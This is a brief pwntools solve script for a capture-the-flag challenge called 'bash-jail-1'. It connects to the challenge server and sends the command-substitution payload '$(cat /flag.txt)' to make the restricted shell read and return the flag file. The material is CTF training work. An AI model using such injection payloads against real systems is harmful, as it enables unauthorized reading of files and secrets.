# bash-jail-1 — Pwny-CTF (script de solve)
from pwn import *

HOST, PORT = "chal.sigpwny.com", 5005
context.log_level = "debug"

io = remote(HOST, PORT)

io.recv()

payload = b"$(cat /flag.txt)"
io.sendline(payload)

io.interactive()

io.recv()
